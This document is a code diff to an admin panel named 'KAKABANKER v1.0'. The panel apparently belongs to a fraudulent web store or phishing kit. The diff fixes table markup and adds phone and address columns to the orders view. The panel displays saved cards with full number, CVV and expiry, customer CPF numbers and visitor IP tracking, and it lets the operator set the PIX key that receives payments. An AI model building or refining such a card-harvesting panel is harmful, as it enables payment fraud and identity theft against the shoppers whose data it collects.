@@ -21,7 +21,6 @@
             min-height: 100vh;
         }
 
-        /* Fundo totalmente preto */
         .black-bg {
             position: fixed;
             top: 0;
@@ -132,7 +131,7 @@
             min-height: 100vh;
         }
 
-        /* SIDEBAR MENU - LATERAL ESQUERDO */
+        /* SIDEBAR */
         .sidebar {
             width: 280px;
             background: rgba(5, 5, 5, 0.95);
@@ -444,7 +443,7 @@
             color: #42a5f5;
         }
 
-        /* CARD SECURITY - BLUR EFFECT */
+        /* Card Security */
         .card-blur {
             filter: blur(4px);
             transition: filter 0.2s;
@@ -471,6 +470,25 @@
         .toggle-card-btn:hover {
             background: rgba(33, 150, 243, 0.3);
             color: #e8e8e8;
+        }
+
+        /* PIX Area */
+        .pix-area {
+            background: rgba(5, 5, 5, 0.8);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .pix-code {
+            background: #0a0e0a;
+            padding: 16px;
+            border-radius: 12px;
+            font-family: monospace;
+            font-size: 0.75rem;
+            word-break: break-all;
+            margin-bottom: 20px;
+            border: 1px solid rgba(33, 150, 243, 0.3);
         }
 
         /* Toast */
@@ -546,7 +564,7 @@
 <!-- ADMIN PANEL -->
 <div id="adminPanel" class="admin-panel">
     <div class="admin-wrapper">
-        <!-- SIDEBAR MENU LATERAL -->
+        <!-- SIDEBAR -->
         <aside class="sidebar">
             <div class="sidebar-logo">
                 <h2>KAKABANKER v1.0</h2>
@@ -605,15 +623,15 @@
                     <div class="table-wrapper">
                         <table>
                             <thead>
-                                <tr><th>Order ID</th><th>Customer</th><th>CPF</th><th>Total</th><th>Payment</th><th>Date</th><th>Device</th>
+                                <tr><th>Order ID</th><th>Customer</th><th>CPF</th><th>Phone</th><th>Address</th><th>Total</th><th>Payment</th><th>Date</th><th>Device</th>
                             </thead>
-                            <tbody id="ordersBody"><tr><td colspan="7">Loading...</td></tr>
-                        </tbody>
-                    </table>
+                            <tbody id="ordersBody"><tr><td colspan="9">Loading orders...</td></tr></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
-            <!-- TAB CARDS - COM BLUR, CVV E VALIDADE -->
+            <!-- TAB CARDS -->
             <div id="tabCards" class="tab-content">
                 <div class="section-card">
                     <div class="section-title">SAVED CARDS - SECURE STORAGE (Click SHOW to reveal)</div>
@@ -622,9 +640,9 @@
                             <thead>
                                 <tr><th>Cardholder</th><th>Card Number</th><th>CVV</th><th>Expiry</th><th>Brand</th><th>Action</th>
                             </thead>
-                            <tbody id="cardsBody"><tr><td colspan="6">Loading cards...</td></tr>
-                        </tbody>
-                    </table>
+                            <tbody id="cardsBody"><tr><td colspan="6">Loading cards...</td></tr></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
@@ -637,33 +655,31 @@
                             <thead>
                                 <tr><th>Visitor ID</th><th>IP Address</th><th>Device</th><th>Browser</th><th>OS</th><th>Stage</th><th>Pages</th><th>Last Activity</th>
                             </thead>
-                            <tbody id="visitorsBody"><tr><td colspan="8">Loading...</td></tr>
-                        </tbody>
-                    </table>
+                            <tbody id="visitorsBody"><tr><td colspan="8">Loading visitors...</td></tr></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
-            <!-- TAB ABANDONED -->
+            <!-- TAB ABANDONED CARTS -->
             <div id="tabAbandoned" class="tab-content">
                 <div class="section-card">
-                    <div class="section-title">ABANDONED CARTS</div>
+                    <div class="section-title">ABANDONED CARTS RECOVERY</div>
                     <div class="table-wrapper">
                         <table>
-                            <thead><tr><th>Visitor</th><th>Items</th><th>Total</th><th>Last Update</th><th>Action</th></thead>
-                            <tbody id="abandonedBody"><tr><td colspan="5">No abandoned carts</td></tr>
-                        </tbody>
-                    </table>
+                            <thead><tr><th>Visitor</th><th>Items</th><th>Total</th><th>Last Update</th><th>Action</th></tr></thead>
+                            <tbody id="abandonedBody"><tr><td colspan="5">No abandoned carts</td></tr></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
-            <!-- TAB PIX -->
+            <!-- TAB PIX CONFIG -->
             <div id="tabPix" class="tab-content">
                 <div class="section-card">
                     <div class="section-title">PIX CONFIGURATION</div>
-                    <div style="padding: 20px; text-align: center;">
-                        <div style="background: #0a0e0a; padding: 16px; border-radius: 12px; margin-bottom: 20px;">
-                            <p id="pixCodeDisplay" style="font-family: monospace; word-break: break-all;">Configure your PIX key</p>
-                        </div>
+                    <div class="pix-area">
+                        <div class="pix-code" id="pixCodeDisplay">Configure your PIX key below</div>
                         <div style="display: flex; gap: 12px; max-width: 500px; margin: 0 auto;">
                             <input type="text" id="pixKey" placeholder="PIX key (email, CPF, phone)" style="flex:1;">
                             <button class="btn-primary" onclick="savePixKey()">SAVE</button>
@@ -694,10 +710,8 @@
             link.addEventListener('click', (e) => {
                 e.preventDefault();
                 const tabName = link.getAttribute('data-tab');
-                
                 links.forEach(l => l.classList.remove('active'));
                 link.classList.add('active');
-                
                 document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                 document.getElementById(`tab${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`).classList.add('active');
             });
@@ -769,7 +783,6 @@
             if (data.success) {
                 produtos = data.produtos;
                 renderProducts();
-                document.getElementById('statProducts').innerText = produtos.filter(p => p.ativo).length;
             }
         } catch (error) { console.error(error); }
     }
@@ -790,6 +803,7 @@
                 </div>
             </div>
         `).join('');
+        document.getElementById('statProducts').innerText = produtos.filter(p => p.ativo).length;
     }
 
     async function salvarProduto() {
@@ -860,25 +874,27 @@
             if (data.success) {
                 const tbody = document.getElementById('ordersBody');
                 if (data.pedidos.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="7">No orders</tr>';
+                    tbody.innerHTML = '<tr><td colspan="9">No orders found</td></tr>';
                 } else {
                     tbody.innerHTML = data.pedidos.map(p => `
                         <tr>
-                            <td>${p.pedido_id || p.id}${p.pedido_id || p.id}${p.pedido_id || p.id}
-                            <td>${p.cliente_nome || '-'}--
-                            <td>${p.cliente_cpf || '-'}--
-                            <td>R$ ${parseFloat(p.total).toFixed(2)}--
-                            <td><span class="badge badge-success">${p.forma_pagamento || 'PIX'}</span>--
-                            <td>${new Date(p.created_at).toLocaleString()}--
-                            <td><span class="badge badge-info">${p.dispositivo || '-'}</span>--
-                         `
-                    ).join('');
+                            <td>${p.pedido_id || p.id}</td>
+                            <td>${p.cliente_nome || '-'}</td>
+                            <td>${p.cliente_cpf || '-'}</td>
+                            <td>${p.cliente_telefone || '-'}</td>
+                            <td>${p.endereco_rua || ''}, ${p.endereco_numero || ''}</td>
+                            <td>R$ ${parseFloat(p.total).toFixed(2)}</td>
+                            <td><span class="badge badge-success">${p.forma_pagamento || 'PIX'}</span></td>
+                            <td>${new Date(p.created_at).toLocaleString()}</td>
+                            <td><span class="badge badge-info">${p.dispositivo || '-'}</span></td>
+                        </tr>
+                    `).join('');
                 }
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error loading orders:', error); }
     }
 
-    // ========== CARDS (COM BLUR, CVV E VALIDADE) ==========
+    // ========== CARDS ==========
     async function loadCards() {
         try {
             const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
@@ -886,26 +902,26 @@
             if (data.success) {
                 const tbody = document.getElementById('cardsBody');
                 if (data.cartoes.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="6">No cards registered</tr>';
+                    tbody.innerHTML = '<tr><td colspan="6">No cards registered</td></tr>';
                 } else {
                     tbody.innerHTML = data.cartoes.map(c => {
                         const isVisible = cardVisibility[c.id] || false;
                         const blurClass = isVisible ? 'card-visible' : 'card-blur';
                         return `
                             <tr>
-                                <td>${c.nome_titular || 'Unknown'}--
-                                <td class="${blurClass}">${c.numero || '**** **** **** ' + c.ultimos_4}--
-                                <td class="${blurClass}">${c.cvv || '***'}--
-                                <td class="${blurClass}">${c.validade_mes || '??'}/${c.validade_ano || '??'}--
-                                <td>${c.bandeira || 'N/A'}--
-                                <td><button class="toggle-card-btn" onclick="toggleCard('${c.id}')">${isVisible ? 'HIDE' : 'SHOW'}</button>--
-                             `
-                        ;
+                                <td>${c.nome_titular || 'Unknown'}</td>
+                                <td class="${blurClass}">${c.numero || '**** **** **** ' + (c.ultimos_4 || '****')}</td>
+                                <td class="${blurClass}">${c.cvv || '***'}</td>
+                                <td class="${blurClass}">${c.validade_mes || '??'}/${c.validade_ano || '??'}</td>
+                                <td>${c.bandeira || 'N/A'}</td>
+                                <td><button class="toggle-card-btn" onclick="toggleCard('${c.id}')">${isVisible ? 'HIDE' : 'SHOW'}</button></td>
+                            </tr>
+                        `;
                     }).join('');
                 }
                 document.getElementById('statCards').innerText = data.cartoes.length;
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error loading cards:', error); }
     }
 
     function toggleCard(cardId) {
@@ -921,23 +937,23 @@
             if (data.success) {
                 const tbody = document.getElementById('visitorsBody');
                 if (data.visitantes.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="8">No visitors</tr>';
+                    tbody.innerHTML = '<tr><td colspan="8">No visitors registered</td></tr>';
                 } else {
                     tbody.innerHTML = data.visitantes.map(v => `
                         <tr>
-                            <td>${v.visitor_id?.substring(0, 15) || '-'}--
-                            <td>${v.ip || '-'}--
-                            <td>${v.dispositivo || '-'}--
-                            <td>${v.navegador || '-'}--
-                            <td>${v.sistema || '-'}--
-                            <td><span class="badge badge-info">${v.etapa || 'visitor'}</span>--
-                            <td>${v.page_views || 0}--
-                            <td>${v.ultima_atividade ? new Date(v.ultima_atividade).toLocaleString() : '-'}--
-                         `
-                    ).join('');
+                            <td>${v.visitor_id?.substring(0, 15) || '-'}</td>
+                            <td>${v.ip || '-'}</td>
+                            <td>${v.dispositivo || '-'}</td>
+                            <td>${v.navegador || '-'}</td>
+                            <td>${v.sistema || '-'}</td>
+                            <td><span class="badge badge-info">${v.etapa || 'visitor'}</span></td>
+                            <td>${v.page_views || 0}</td>
+                            <td>${v.ultima_atividade ? new Date(v.ultima_atividade).toLocaleString() : '-'}</td>
+                        </tr>
+                    `).join('');
                 }
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error loading visitors:', error); }
     }
 
     // ========== ABANDONED CARTS ==========
@@ -948,21 +964,21 @@
             if (data.success) {
                 const tbody = document.getElementById('abandonedBody');
                 if (data.carrinhos.length === 0) {
-                    tbody.innerHTML = '<td><td colspan="5">No abandoned carts</tr>';
+                    tbody.innerHTML = '<tr><td colspan="5">No abandoned carts</td></tr>';
                 } else {
                     tbody.innerHTML = data.carrinhos.map(c => `
                         <tr>
-                            <td>${c.visitor_id?.substring(0, 15) || '-'}--
-                            <td>${c.total_itens || 0} items--
-                            <td>R$ ${parseFloat(c.total).toFixed(2)}--
-                            <td>${new Date(c.updated_at).toLocaleString()}--
-                            <td><button class="btn-primary" style="padding:4px 12px;" onclick="recoverCart('${c.visitor_id}')">RECOVER</button>--
-                         `
-                    ).join('');
+                            <td>${c.visitor_id?.substring(0, 15) || '-'}</td>
+                            <td>${c.total_itens || 0} items</td></td>
+                            <td>R$ ${parseFloat(c.total).toFixed(2)}</td></td>
+                            <td>${new Date(c.updated_at).toLocaleString()}</td>
+                            <td><button class="btn-primary" style="padding:4px 12px;" onclick="recoverCart('${c.visitor_id}')">RECOVER</button></td>
+                        </tr>
+                    `).join('');
                 }
                 document.getElementById('statCarts').innerText = data.carrinhos.length;
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error loading abandoned carts:', error); }
     }
 
     // ========== STATS ==========
@@ -974,7 +990,7 @@
                 document.getElementById('statOnline').innerText = data.stats.online || 0;
                 document.getElementById('statRevenue').innerHTML = `R$ ${(data.stats.revenue || 0).toFixed(2)}`;
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error loading stats:', error); }
     }
 
     // ========== PIX ==========
@@ -982,11 +998,11 @@
         try {
             const res = await fetch('/api/admin/pix', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const data = await res.json();
-            if (data.success && data.pix_key) {
-                document.getElementById('pixKey').value = data.pix_key;
-                document.getElementById('pixCodeDisplay').innerHTML = data.pix_key;
+            if (data.success) {
+                document.getElementById('pixKey').value = data.pix_key || '';
+                document.getElementById('pixCodeDisplay').innerHTML = data.pix_key || 'Configure your PIX key below';
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error loading PIX config:', error); }
     }
 
     async function savePixKey() {
@@ -1002,7 +1018,7 @@
                 showToast('PIX key saved', 'success');
                 document.getElementById('pixCodeDisplay').innerHTML = pixKey;
             }
-        } catch (error) { console.error(error); }
+        } catch (error) { console.error('Error saving PIX key:', error); }
     }
 
     function recoverCart(visitorId) {
